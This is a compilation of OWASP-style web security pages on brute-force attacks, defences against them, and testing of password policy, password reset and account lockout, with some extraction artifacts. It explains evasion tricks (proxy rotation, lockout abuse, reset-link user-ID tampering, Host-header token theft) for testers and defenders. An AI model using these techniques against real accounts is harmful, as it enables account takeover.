      <h2>Risk Factors</h2>
      <h2>Examples</h2>
      <p>Brute-force attacks are often used for attacking authentication anddiscovering hidden content/pages within a web application. These attacksare usually sent via GET and POST requests to the server. In regards toauthentication, brute force attacks are often mounted when an <a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#account-lockout">accountlockout policy</a>is not in place.</p>
      <h3>Example 1</h3>
      <p>A web application can be attacked via brute force by taking a word listof known pages, for instance from a popular content management system,and simply requesting each known page then analyzing the HTTP responsecode to determine if the page exists on the target server.</p>
      <p><a href="https://wiki.owasp.org/index.php/Category:OWASP_DirBuster_Project">DirBuster</a>is a tool that does exactly this.</p>
      <p>Other tools for this type of attack are as follows:</p>
      <ul>
          <li><a href="http://sourceforge.net/projects/dirb/">dirb</a></li>
          <li>&nbsp;</li>
          <li><a href="http://www.cirt.dk/tools/webroot/WebRoot.txt">WebRoot</a></li>
      </ul>
      <p>dirb is capable of:</p>
      <ul>
          <li>setting cookies</li>
          <li>&nbsp;</li>
          <li>adding any HTTP header</li>
          <li>&nbsp;</li>
          <li>using PROXY</li>
          <li>&nbsp;</li>
          <li>mutating objects which were found</li>
          <li>&nbsp;</li>
          <li>testing http(s) connections</li>
          <li>&nbsp;</li>
          <li>seeking catalogues or files using defined dictionaries and templates</li>
          <li>&nbsp;</li>
          <li>and much much more</li>
      </ul>
      <p>The simplest test to perform is:</p>

      </div>
      <p>In the output the attacker is informed that <code>phpmyadmin/</code> directory wasfound. The attacker has now found a potential directory of interestwithin this application. In dirb&rsquo;s templates there are, among others, adictionary containing information about invalid httpd configurations.This dictionary will detect weaknesses of this kind.</p>
      <p>The application<a href="http://www.cirt.dk/tools/webroot/WebRoot.txt">WebRoot.pl</a>, written byCIRT.DK, has embedded mechanisms for parsing server responses, and basedon the phrase specified by the attacker, measures if the server responseis expected.</p>

      <ul>
          <li>Road Blocks:</li>
      </ul>
      <p>One of the main issues with tools like dirb/dirbuster consist in theanalysis of server responses. With more advanced server configuration(e.g. with mod_rewrite) automatic tools are sometimes unable todetermine &ldquo;File not found&rdquo; errors due to the server response being anHTTP response code 200 but the page itself indicates &ldquo;File not found&rdquo;.This can lead to false positives if the brute force tool is only relyingon HTTP response codes.</p>
      <p><a href="http://portswigger.net/">Burp Suite</a>, can be used to parse specific parts ofthe page returned, looking for certain strings in an effort to reducefalse positives.</p>
      <h3>Example 2</h3>
      <p>In regards to authentication, when no password policy is in place anattacker can use lists of common username and passwords to brute force ausername or password field until successful authentication.</p>
      <h2>Defensive Tools</h2>
      <p><a href="http://yehg.net/lab/pr0js/files.php/php_brute_force_detect.zip">Php-Brute-Force-Attack Detector</a></p>
      <p>Detect your web servers being scanned by brute force tools such asWFuzz, OWASP DirBuster and vulnerability scanners such as Nessus, Nikto,Acunetix, etc. This helps you quickly identify probable probing by badactors who want to dig possible security holes.</p>

    <sl-details summary="Blocking Brute Force Attacks" >
      <h2>Blocking Brute Force Attacks</h2>
    <p>A common threat web developers face is a password-guessing attack known as a brute force attack. A brute-force attack is an attempt to discover a password by systematically trying every possible combination of letters, numbers, and symbols until you discover the one correct combination that works. If your web site requires user authentication, you are a good target for a brute-force attack.</p>
    <p>An attacker can always discover a password through a brute-force attack, but the downside is that it could take years to find it.Depending on the password&rsquo;s length and complexity, there could be trillions of possible combinations.</p>
    <p>To speed things up a bit, a brute-force attack could start with dictionary words or slightly modified dictionary words because most people will use those rather than a completely random password. These attacks are called dictionary attacks or hybrid brute-force attacks.Brute-force attacks put user accounts at risk and flood your site with unnecessary traffic.</p>
    <p>Hackers launch brute-force attacks using widely available tools that utilize wordlists and smart rulesets to intelligently and automatically guess user passwords. Although such attacks are easy to detect, they are not so easy to prevent.</p>
    <p>For example, many HTTP brute-force tools can relay requests through a list of open proxy servers. Since each request appears to come from a different IP address, you cannot block these attacks simply by blocking the IP address. To further complicate things, some tools try a different username and password on each attempt, so you cannot lock out a single account for failed password attempts.</p>
    <h2>Locking Accounts</h2>
    <p>The most obvious way to block brute-force attacks is to simply lock out accounts after a defined number of incorrect password attempts. Account lockouts can last a specific duration, such as one hour, or the accounts could remain locked until manually unlocked by an administrator.</p>
    <p>However, account lockout is not always the best solution, because someone could easily abuse the security measure and lock out hundreds of user accounts. In fact, some Web sites experience so many attacks that they are unable to enforce a lockout policy because they would constantly be unlocking customer accounts.</p>
    <p>The problems with account lockouts are:</p>
    <ul>
        <li>An attacker can cause a denial of service (DoS) by locking out large numbers of accounts.</li>
        <li>&nbsp;</li>
        <li>Because you cannot lock out an account that does not exist, only valid account names will lock. An attacker could use this fact to harvest usernames from the site, depending on the error responses.</li>
        <li>&nbsp;</li>
        <li>An attacker can cause a diversion by locking out many accounts and flooding the help desk with support calls.</li>
        <li>&nbsp;</li>
        <li>An attacker can continuously lock out the same account, even seconds after an administrator unlocks it, effectively disabling the account.</li>
        <li>&nbsp;</li>
        <li>Account lockout is ineffective against slow attacks that try only a few passwords every hour.</li>
        <li>&nbsp;</li>
        <li>Account lockout is ineffective against attacks that try one password against a large list of usernames.</li>
        <li>&nbsp;</li>
        <li>Account lockout is ineffective if the attacker is using a username/password combo list and guesses correctly on the first couple of attempts.</li>
        <li>&nbsp;</li>
        <li>Powerful accounts such as administrator accounts often bypass lockout policy, but these are the most desirable accounts to attack. Some systems lock out administrator accounts only on network-based logins.</li>
        <li>&nbsp;</li>
        <li>Even once you lock out an account, the attack may continue, consuming valuable human and computer resources.</li>
    </ul>
    <p>Account lockout is sometimes effective, but only in controlled environments or in cases where the risk is so great that even continuous DoS attacks are preferable to account compromise. In most cases, however, account lockout is insufficient for stopping brute-force attacks.</p>
    <p>Consider, for example, an auction site on which several bidders are fighting over the same item. If the auction Web site enforced account lockouts, one bidder could simply lock the others&rsquo; accounts in the last minute of the auction, preventing them from submitting any winning bids. An attacker could use the same technique to block critical financial transactions or e-mail communications.</p>
    <h2>Device Cookies</h2>
    <p>You may also consider locking out authentication attempts from known and unknown browsers or devices separately. The <a href="https://owasp.org/www-community/Slow_Down_Online_Guessing_Attacks_with_Device_Cookies">Slow Down Online Guessing Attacks with Device Cookies</a> article proposes protocol for lockout mechanism based on information about if specific browser have been already used for successful login.The protocol is less susceptible to DoS attacks than plain account locking out and yet effective and easy to implement.</p>
    <h2>Finding Other Countermeasures</h2>
    <p>As described, account lockouts are usually not a practical solution, but there are other tricks to deal with brute force attacks. First, since the success of the attack is dependent on time, an easy solution is to inject random pauses when checking a password. Adding even a few seconds&rsquo; pause can greatly slow a brute-force attack but will not bother most legitimate users as they log in to their accounts.</p>
    <p>Note that although adding a delay could slow a single-threaded attack, it is less effective if the attacker sends multiple simultaneous authentication requests.</p>
    <p>Another solution is to lock out an IP address with multiple failed logins. The problem with this solution is that you could inadvertently block large groups of users by blocking a proxy server used by an ISP or large company.Another problem is that many tools utilize proxy lists and send only a few requests from each IP address before moving on to the next.</p>
    <p>Using widely available open proxy lists, an attacker could easily circumvent any IP blocking mechanism. Because most sites do not block after just one failed password, an attacker can use two or three attempts per proxy. An attacker with a list of 1,000 proxies can attempt 2,000 or 3,000 passwords without being blocked.</p>
    <p>Nevertheless, despite this method&rsquo;s weaknesses, Web sites that experience high numbers of attacks (adult Web sites in particular) do choose to block proxy IP addresses.</p>
    <p>One simple yet surprisingly effective solution is to design your Website not to use predictable behavior for failed passwords. For example, most Web sites return an &ldquo;HTTP 401 error&rdquo; code with a password failure, although some web sites instead return an &ldquo;HTTP 200 SUCCESS&rdquo; code but direct the user to a page explaining the failed password attempt. This fools some automated systems, but it is also easy to circumvent.</p>
    <p>A better solution might be to vary the behavior enough to eventually discourage all but the most dedicated hackers. You could, for example, use different error messages each time or sometimes let a user through to a page and then prompt them again for a password.</p>
    <p>Some automated brute-force tools allow the attacker to set certain trigger strings to look for that indicate a failed password attempt. For example, if the resulting page contains the phrase &ldquo;Bad username or password,&rdquo; the tool would know the credentials failed and would try the next in the list. A simple way to fool these tools is to include also those phrases as comments in the HTML source of the page they get when they successfully authenticate.</p>
    <p>After one or two failed login attempts, you may want to prompt the user not only for the username and password but also to answer a secret question.This not only causes problems with automated attacks, it prevents an attacker from gaining access, even if they do get the username and password correct.</p>
    <p>You could also detect high numbers of attacks system-wide and under those conditions prompt all users for the answer to their secret questions.</p>
    <p>Other techniques you might want to consider are:</p>
    <ul>
        <li>For advanced users who want to protect their accounts from attack, give them the option to allow login only from certain IP addresses.</li>
        <li>&nbsp;</li>
        <li>Assign unique login URLs to blocks of users so that not all users can access the site from the same URL.</li>
        <li>&nbsp;</li>
        <li>Use a <a href="https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks#sidebar-using-captchas">CAPTCHA</a> to prevent automated attacks</li>
        <li>&nbsp;</li>
        <li>Instead of completely locking out an account, place it in a lockdown mode with limited capabilities.</li>
    </ul>
    <p>Attackers can often circumvent many of these techniques by themselves, but by combining several techniques, you can significantly limit brute-force attacks.It might be difficult to stop an attacker who is determined to obtain a password specifically from your web site, but these techniques certainly can be effective against many attacks, including those from novice hackers. These techniques also require more work on the attacker&rsquo;s part, which gives you more opportunity to detect the attack and maybe even identify the attacker.</p>
    <p>Although brute-force attacks are difficult to stop completely, they are easy to detect because each failed login attempt records an HTTP 401 status code in your Web server logs. It is important to monitor your logfiles for brute-force attacks &ndash; in particular, the intermingled 200 statuscodes that mean the attacker found a valid password.</p>
    <p>Here are conditions that could indicate a brute-force attack or other account abuse:</p>
    <ul>
        <li>Many failed logins from the same IP address</li>
        <li>&nbsp;</li>
        <li>Logins with multiple usernames from the same IP address</li>
        <li>&nbsp;</li>
        <li>Logins for a single account coming from many different IP addresses</li>
        <li>&nbsp;</li>
        <li>Excessive usage and bandwidth consumption from a single use</li>
        <li>&nbsp;</li>
        <li>Failed login attempts from alphabetically sequential usernames or passwords</li>
        <li>&nbsp;</li>
        <li>Logins with a referring URL of someone&rsquo;s mail or IRC client</li>
        <li>&nbsp;</li>
        <li>Referring URLs that contain the username and password in the format &lt;http://user:password@www.example.com/login.htm&gt;</li>
        <li>&nbsp;</li>
        <li>If protecting an adult Web site, referring URLs of known password-sharing sites</li>
        <li>&nbsp;</li>
        <li>Logins with suspicious passwords hackers commonly use, such as ownsyou (ownzyou), washere (wazhere), zealots, hacksyou, and the like</li>
    </ul>
    <p>Brute force attacks are surprisingly difficult to stop completely, but with careful design and multiple countermeasures, you can limit your exposure to these attacks.</p>
    <p>Ultimately, the only best defense is to make sure that users follow basic rules for strong passwords: use long unpredictable passwords, avoid dictionary words, avoid reusing passwords, and change passwords regularly.</p>
    <h2>Sidebar: Using CAPTCHAS</h2>
    <p>A completely automated public Turing test to tell computers and humans apart, or CAPTCHA, is a program that allows you to distinguish between humans and computers.First widely used by Alta Vista to prevent automated search submissions, CAPTCHAs are particularly effective in stopping any kind of automated abuse, including brute-force attacks.</p>
    <p>They work by presenting some test that is easy for humans to pass but difficult for computers to pass; therefore, they can conclude with some certainty whether there is a human on the other end.</p>
    <p>For a CAPTCHA to be effective, humans must be able to answer the test correctly as close to 100 percent of the time as possible. Computers must fail as close to 100 percent of the time as possible. Researchers at Carnegie Mellon&rsquo;s School of Computer Science continually <a href="https://owasp.org/www-community/controls/www.captcha.net/captchas">work to improve and introduce new CAPTCHAs</a>.</p>
    <p>If you are developing your own CAPTCHA, keep in mind that it is not how hard the question is that matters-it is how likely it is that a computer will get the correct answer. I once saw a CAPTCHA that presents the user with a picture of three zebras, with a multiple-choice question asking how many zebras were in the picture. To answer the question, you click one of three buttons.</p>
    <p>Although it would be very difficult for a computer program to both understand the question and interpret the picture, the program could just randomly guess any answer and get it correct a third of the time. Although this might seem a satisfactory level of risk, it is by no means an effective CAPTCHA. If you run a free e-mail service and use a CAPTCHA such as this to prevent spammers from creating accounts in bulk, all they have to do is write a script to automatically create 1,000 accounts and expect on average that 333 of those attempts will be successful.</p>
    <p>Nevertheless, a simple CAPTCHA may still be effective against brute-force attacks.When you combine the chance of an attacker sending a correct username and password guess with the chance of guessing the CAPTCHA correctly, combined with other techniques described in this chapter, even a simple CAPTCHA could prove effective.</p>

      <h1>Testing for Weak Password Policy</h1>
    </br>
    <h4>The most prevalent and most easily administered authentication mechanism is a static password. The password represents the keys to the kingdom, but is often subverted by users in the name of usability. In each of the recent high profile hacks that have revealed user credentials, it is lamented that most common passwords are still: <code>123456</code>, <code>password</code> and <code>qwerty</code>.</h4>
    <h2>Test Objectives</h2>
    <ul>
        <li>Determine the resistance of the application against brute force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.</li>
    </ul>
    <h2>How to Test</h2>
    <ol>
        <li>What characters are permitted and forbidden for use within a password? Is the user required to use characters from different character sets such as lower and uppercase letters, digits and special symbols?</li>
        <li>&nbsp;</li>
        <li>How often can a user change their password? How quickly can a user change their password after a previous change? Users may bypass password history requirements by changing their password 5 times in a row so that after the last password change they have configured their initial password again.</li>
        <li>&nbsp;</li>
        <li>When must a user change their password? &nbsp; &nbsp;<ul>
                <li>Both <a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecretver">NIST</a> and <a href="https://www.ncsc.gov.uk/collection/passwords/updating-your-approach#PasswordGuidance:UpdatingYourApproach-Don'tenforceregularpasswordexpiry">NCSC</a> recommend <strong>against</strong> forcing regular password expiry, although it may be required by standards such as PCI DSS.</li>
            </ul>
        </li>
        <li>&nbsp;</li>
        <li>How often can a user reuse a password? Does the application maintain a history of the user&rsquo;s previous used 8 passwords?</li>
        <li>&nbsp;</li>
        <li>How different must the next password be from the last password?</li>
        <li>&nbsp;</li>
        <li>Is the user prevented from using his username or other account information (such as first or last name) in the password?</li>
        <li>&nbsp;</li>
        <li>What are the minimum and maximum password lengths that can be set, and are they appropriate for the sensitivity of the account and application?</li>
        <li>&nbsp;</li>
        <li>Is it possible to set common passwords such as <code>Password1</code> or <code>123456</code>?</li>
    </ol>
    <h2>Remediation</h2>
    <p>To mitigate the risk of easily guessed passwords facilitating unauthorized access there are two solutions: introduce additional authentication controls (i.e. two-factor authentication) or introduce a strong password policy. The simplest and cheapest of these is the introduction of a strong password policy that ensures password length, complexity, reuse and aging; although ideally both of them should be implemented.</p>

      <h1>Testing for Weak Password Change or Reset Functionalities</h1></br>
    
      <h4>For any application that requires the user to authenticate with a password, there must be a mechanism by which the user can regain access to their account if they forget their password. Although this can sometimes be a manual process that involves contacting the owner of the website or a support team, users are frequently allowed to carry out a self-service password reset, and to regain access to their account by providing some other evidence of their identity.</h4>
      <p>As this functionality provides a direct route to compromise the user&rsquo;s account, it is crucial that it is implemented securely.</p>
      <h2>Test Objectives</h2>
      <ul>
          <li>Determine whether the password change and reset functionality allows accounts to be compromised.</li>
      </ul>
      <h2>How to Test</h2>
      <h3>Information Gathering</h3>
      <p>The first step is to gather information about what mechanisms are available to allow the user to reset their password on the application. If there are multiple interfaces on the same site (such as a web interface, mobile application, and API) then these should all be reviewed, in case they provide different functionality.</p>
      <p>Once this has been established, determine what information is required in order for a user to initiate a password reset. This can be the username or email address (both of which may be obtained from public information), but it could also be an internally-generated user ID.</p>
      <h3>General Concerns</h3>
      <p>Regardless of the specific methods used to reset passwords, there are a number of common areas that need to be considered:</p>
      <ul>
          <li>
              <p>Is the password reset process weaker than the authentication process?</p>&nbsp; &nbsp;<p>The password reset process provides an alternative mechanism to access a user&rsquo;s account, and so should be at least as secure as the usual authentication process. However, it can provide an easier way to compromise the account, especially if it uses weaker authentication factors such as security questions.</p>&nbsp; &nbsp;<p>Additionally, the password reset process may bypass the requirement to use Multi-Factor Authentication (MFA), which can substantially reduce the security of the application.</p>
          </li>
          <li>
              <p>Is there rate limiting or other protection against automated attacks?</p>&nbsp; &nbsp;<p>As with any authentication mechanism, the password reset process should have protection against automated or brute-force attacks. There are a variety of different methods that can be used to achieve this, such as rate limiting or the use of CAPTCHA. These are particularly important on functionality that triggers external actions (such as sending an email or SMS), or when the user is entering a password reset token.</p>&nbsp; &nbsp;<p>It is also possible to protect against brute-force attacks by locking out the account from the password reset process after a certain number of consecutive attempts. This could also prevent a legitimate user from being able to reset their password and regain access to their account, however.</p>
          </li>
          <li>
              <p>Is it vulnerable to common attacks?</p>&nbsp; &nbsp;<p>As well as the specific areas discussed in this guide, it&rsquo;s also important to check for other common vulnerabilities such as SQL injection or cross-site scripting.</p>
          </li>
          <li>
              <p>Does the reset process allow user enumeration?</p>&nbsp; &nbsp;<p>See the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account">Testing for Account Enumeration</a> guide for further information.</p>

      </ul>
      <h3>Email - New Password Sent</h3>
      <p>In this model, the user is sent a new password via email once they have proved their identity. This is considered less secure for two main reasons:</p>
      <ul>
          <li>The password is sent to the user in an unencrypted form.</li>
          <li>The password for the account is changed when the request is made, effectively locking the user out of their account until they receive the email. By making repeated requests, it is possible to prevent a user from being able to access their account.</li>
      </ul>
      <p>Where this approach is used, the following areas should be reviewed:</p>
      <ul>
          <li>
              <p>Is the user forced to change the password on initial login?</p>&nbsp; &nbsp;<p>The new password is sent over unencrypted email, and may sit in the user&rsquo;s inbox indefinitely if they don&rsquo;t delete the email. As such, the user should be required to change the password as soon as they log in for the first time.</p>
          </li>
          <li>
              <p>Is the password securely generated?</p>&nbsp; &nbsp;<p>The password should be generated using a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and should be sufficiently long to prevent password guessing or brute-force attacks. For a secure user-friendly experience, it should be generated using a secure passphrase-style approach (i.e, combining multiple words), rather than a string of random characters.</p>
          </li>
          <li>
              <p>Is the user&rsquo;s existing password sent to them?</p>&nbsp; &nbsp;<p>Rather than generating a new password for the user, some applications will send the user their existing password. This is a very insecure approach, as it exposes their current password over unencrypted email. Additionally, if the site is able to recover the existing password, this implies that passwords are either stored using reversible encryption, or (more likely) in unencrypted plain text, both of which represent a serious security weakness.</p>
          </li>
          <li>
              <p>Are the emails sent from a domain with anti-spoofing protection?</p>&nbsp; &nbsp;<p>The domain should implement SPF, DKIM, and DMARC to prevent attackers from spoofing emails from it, which could be used as part of a social engineering attack.</p>
          </li>
          <li>
              <p>Is email considered sufficiently secure?</p>&nbsp; &nbsp;<p>Emails are typically sent unencrypted, and in many cases the user&rsquo;s email account will not be protected by MFA. It may also be shared between multiple individuals, particularly in a corporate environment.</p>&nbsp; &nbsp;<p>Consider whether email-based password reset functionality is appropriate, based on the context of the application that is being tested.</p>
          </li>
      </ul>
      <h3>Email - Link Sent</h3>
      <p>In this model, the user is emailed a link that contains a token. They can then click this link, and are prompted to enter a new password on the site. This is the most common approach used for password reset, but is more complex to implement than the previously discussed approach. The key areas to test are:</p>
      <ul>
          <li>
              <p>Does the link use HTTPS?</p>&nbsp; &nbsp;<p>If the token is sent over unencrypted HTTP, it may be possible for an attacker to intercept it.</p>
          </li>
          <li>
              <p>Can the link be used multiple times?</p>&nbsp; &nbsp;<p>Links should expire after they are used, otherwise they provide a persistent backdoor for the account.</p>
          </li>
          <li>
              <p>Does the link expire if it remains unused?</p>&nbsp; &nbsp;<p>Links should be time limited. Exactly how long is appropriate will depend on the site, but it should rarely be more than an hour.</p>
          </li>
          <li>
              <p>Is the token sufficiently long and random?</p>&nbsp; &nbsp;<p>The security of the process is entirely reliant on an attacker not being able to guess or brute-force a token. The tokens should be generated with a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and should be sufficiently long that it is impractical for an attacker to guess or brute-force. At least 128 bits (or 32 hex characters) is a sufficient minimum to make such an online attack impractical.</p>&nbsp; &nbsp;<p>Tokens should never be generated based on known values, such as by taking the MD5 hash of the user&rsquo;s email with <code>md5($email)</code>, or using GUIDs which may use insecure PRNG functions, or may not even be random depending on the type.</p>&nbsp; &nbsp;<p>An alternative approach to random tokens is to use a cryptographically signed token such as a JWT. In this case, the usual JWT checks should be carried out (is the signature verified, can the &ldquo;nONe&rdquo; algorithm be used, can the HMAC key be brute-forced, etc). See the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens">Testing JSON Web Tokens</a> guide for further information.</p>
          </li>
          <li>
              <p>Does the link contain a user ID?</p>&nbsp; &nbsp;<p>Sometimes the password reset link may include a user ID as well as a token, such as <code>reset.php?userid=1&amp;token=123456</code>. In this case, it may be possible to modify the <code>userid</code> parameter to reset other users&rsquo; passwords.</p>
          </li>
          <li>
              <p>Can you inject a different host header?</p>&nbsp; &nbsp;<p>If the application trusts the value of the <code>Host</code> header and uses this to generate the password reset link, it may be possible to steal tokens by injecting a modified <code>Host</code> header into the request. See the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection">Testing for Host Header Injection</a> guide for further information.</p>
          </li>
          <li>
              <p>Is the link exposed to third parties?</p>&nbsp; &nbsp;<p>If the page that the user is taken to includes content from other parties (such as loading scripts from other domains), then the reset token in the URL may be exposed in the HTTP <code>Referer</code> header sent in these requests. The <code>Referrer-Policy</code> HTTP header can be used to protect against this, so check if one is defined for the page.</p>&nbsp; &nbsp;<p>Additionally, if the page includes any tracking, analytics or advertising scripts, the token will also be exposed to them.</p>
          </li>
          <li>
              <p>Are the emails sent from a domain with anti-spoofing protection?</p>&nbsp; &nbsp;<p>The domain should implement SPF, DKIM, and DMARC to prevent attackers from spoofing emails from it, which could be used as part of a social engineering attack.</p>
          </li>
          <li>
              <p>Is email considered sufficiently secure?</p>&nbsp; &nbsp;<p>Emails are typically sent unencrypted, and in many cases the user&rsquo;s email account will not be protected by MFA. It may also be shared between multiple individuals, particularly in a corporate environment.</p>&nbsp; &nbsp;<p>Consider whether email-based password reset functionality is appropriate, based on the context of the application that is being tested.</p>
          </li>
      </ul>
      <h3>Tokens Sent Over SMS or Phone Call</h3>
      <p>Rather than sending a token in an email, an alternative approach is to send it via SMS or an automated phone call, which the user will then enter on the application. The key areas to test are:</p>
      <ul>
          <li>
              <p>Is the token sufficiently long and random?</p>&nbsp; &nbsp;<p>Tokens sent this way are typically shorter, as they are intended to be manually typed by the user, rather than being embedded in a link. It&rsquo;s fairly common for applications to use six numeric digits, which only provides ~20 bits of security (feasible for an online brute-force attack), rather than the typically longer email token.</p>&nbsp; &nbsp;<p>This makes it much more important that the password reset functionality is protected against brute-force attacks.</p>
          </li>
          <li>
              <p>Can the token be used multiple times?</p>&nbsp; &nbsp;<p>Tokens should be invalidated after they are used, otherwise they provide a persistent backdoor for the account.</p>
          </li>
          <li>
              <p>Does the token expire if it remains unused?</p>&nbsp; &nbsp;<p>As the shorter tokens are more susceptible to brute-force attacks, a shorter expiration time should be implemented to limit the window available for an attacker to carry out an attack.</p>
          </li>
          <li>
              <p>Are appropriate rate limiting and restrictions in place?</p>&nbsp; &nbsp;<p>Sending an SMS or triggering an automated phone call to a user is significantly more disruptive than sending an email, and could be used to harass a user, or even carry out a denial of service attack against their phone. The application should implement rate limiting to prevent this.</p>&nbsp; &nbsp;<p>Additionally, SMS messages and phone calls often incur financial costs for the sending party. If an attacker is able to cause a large number of messages to be sent, this could result in significant costs for the website operator. This is especially true if they are sent to international or premium rate numbers. However, allowing international numbers may be a requirement of the application.</p>
          </li>
          <li>
              <p>Is SMS or a phone call considered sufficiently secure?</p>&nbsp; &nbsp;<p><a href="https://www.ncsc.gov.uk/guidance/protecting-sms-messages-used-in-critical-business-processes#section_4">A variety of attacks</a> have been demonstrated that would allow an attacker to effectively hijack SMS messages, there are conflicting views about whether SMS is sufficiently secure to be used as an authentication factor.</p>&nbsp; &nbsp;<p>It is usually possible to answer an automated phone call with physical access to a device, without needing any kind of PIN or fingerprint to unlock the phone. In some circumstances (such as a shared office environment), this could allow an internal attacker to trivially reset another user&rsquo;s password by walking over to their desk when they are out of office.</p>&nbsp; &nbsp;<p>Consider whether SMS or automated phone calls are appropriate, based on the context of the application that is being tested.</p>
          </li>
      </ul>
      <h3>Security Questions</h3>
      <p>Rather than sending them a link or new password, security questions can be used as a mechanism to authenticate the user. This is considered to be a weak approach, and should not be used if better options are available.</p>
      <p>See the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer">Testing for Weak Security Questions</a> guide for further information.</p>
      <h3>Authenticated Password Changes</h3>
      <p>Once the user has proved their identity (either through a password reset link, a recovery code, or by logging in on the application) they should be able to change their password. The key area to test are:</p>
      <ul>
          <li>
              <p>When setting the password, can you specify the user ID?</p>&nbsp; &nbsp;<p>If the user ID is included in the password reset request and is not validated, it may be possible to modify it and change other users&rsquo; passwords.</p>
          </li>
          <li>
              <p>Is the user required to re-authenticate?</p>&nbsp; &nbsp;<p>If a logged-in user tries to change their password, they should be asked to re-authenticate with their current password in order to protect against an attacker gaining temporary access to an unattended session. If the user has MFA enabled, then they would typically re-authenticate with that, rather than their password.</p>
          </li>
          <li>
              <p>Is the password change form vulnerable to CSRF?</p>&nbsp; &nbsp;<p>If the user isn&rsquo;t required to re-authenticate, then it may be possible to carry out a CSRF attack against the password reset form, allowing their account to be compromised. See the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery">Testing for Cross-Site Request Forgery</a> guide for further information.</p>
          </li>
          <li>
              <p>Is a strong and effective password policy applied?</p>&nbsp; &nbsp;<p>The password policy should be consistent across the registration, password change, and password reset functionality. See the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy">Testing for Weak Password Policy</a> guide for further information.</p>
          </li>
      </ul>
      <p>The password change and reset function of an application is a self-service password change or reset mechanism for users. This self-service mechanism allows users to quickly change or reset their password without an administrator intervening. When passwords are changed they are typically changed within the application. When passwords are reset they are either rendered within the application or emailed to the user. This may indicate that the passwords are stored in plain text or in a decryptable format.</p>
      <h2>Test Objectives</h2>
      <ol>
          <li>Determine the resistance of the application to subversion of the account change process allowing someone to change the password of an account.</li>
          <li>Determine the resistance of the passwords reset functionality against guessing or bypassing.</li>
      </ol>
      <h2>How to Test</h2>
      <p>For both password change and password reset it is important to check:</p>
      <ol>
          <li>if users, other than administrators, can change or reset passwords for accounts other than their own.</li>
          <li>if users can manipulate or subvert the password change or reset process to change or reset the password of another user or administrator.</li>
          <li>if the password change or reset process is vulnerable to <a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery">CSRF</a>.</li>
      </ol>
      <h3>Test Password Reset</h3>
      <p>In addition to the previous checks it is important to verify the following:</p>
      <ul>
          <li>
              <p>What information is required to reset the password?</p>&nbsp; &nbsp;<p>The first step is to check whether secret questions are required. Sending the password (or a password reset link) to the user email address without first asking for a secret question means relying 100% on the security of that email address, which is not suitable if the application needs a high level of security.On the other hand, if secret questions are used, the next step is to assess their strength. This specific test is discussed in detail in the <a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer">Testing for Weak security question/answer</a> paragraph of this guide.</p>
          </li>
          <li>
              <p>How are reset passwords communicated to the user?The most insecure scenario here is if the password reset tool shows you the password; this gives the attacker the ability to log into the account, and unless the application provides information about the last log in the victim would not know that their account has been compromised.A less insecure scenario is if the password reset tool forces the user to immediately change their password. While not as stealthy as the first case, it allows the attacker to gain access and locks the real user out.</p>&nbsp; &nbsp;<p>The best security is achieved if the password reset is done via an email to the address the user initially registered with, or some other email address; this forces the attacker to not only guess at which email account the password reset was sent to (unless the application show this information) but also to compromise that email account in order to obtain the temporary password or the password reset link.</p>
          </li>
          <li>
              <p>Are reset passwords generated randomly?The most insecure scenario here is if the application sends or visualizes the old password in clear text because this means that passwords are not stored in a hashed form, which is a security issue in itself.</p>&nbsp; &nbsp;<p>The best security is achieved if passwords are randomly generated with a secure algorithm that cannot be derived.</p>
          </li>
          <li>
              <p>Is the reset password functionality requesting confirmation before changing the password?To limit denial-of-service attacks the application should email a link to the user with a random token, and only if the user visits the link then the reset procedure is completed. This ensures that the current password will still be valid until the reset has been confirmed.</p>
          </li>
      </ul>
      <h3>Test Password Change</h3>
      <p>In addition to the previous test it is important to verify:</p>
      <ul>
          <li>
              <p>Is the old password requested to complete the change?</p>&nbsp; &nbsp;<p>The most insecure scenario here is if the application permits the change of the password without requesting the current password. Indeed if an attacker is able to take control of a valid session they could easily change the victim&rsquo;s password.See also <a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy">Testing for Weak password policy</a> paragraph of this guide.</p>

      <h1>Testing for Weak Lock Out Mechanism</h1></br>
     
      <h4>Account lockout mechanisms are used to mitigate brute force attacks. Some of the attacks that can be defeated by using lockout mechanism:</h4>
      <ul>
          <li>Login password or username guessing attack.</li>
          <li>&nbsp;</li>
          <li>Code guessing on any 2FA functionality or Security Questions.</li>
      </ul>
      <p>Account lockout mechanisms require a balance between protecting accounts from unauthorized access and protecting users from being denied authorized access. Accounts are typically locked after 3 to 5 unsuccessful attempts and can only be unlocked after a predetermined period of time, via a self-service unlock mechanism, or intervention by an administrator.</p>
      <p>Despite it being easy to conduct brute force attacks, the result of a successful attack is dangerous as the attacker will have full access on the user account and with it all the functionality and services they have access to.</p>
      <h2>Test Objectives</h2>
      <ul>
          <li>Evaluate the account lockout mechanism&rsquo;s ability to mitigate brute force password guessing.</li>
          <li>&nbsp;</li>
          <li>Evaluate the unlock mechanism&rsquo;s resistance to unauthorized account unlocking.</li>
      </ul>
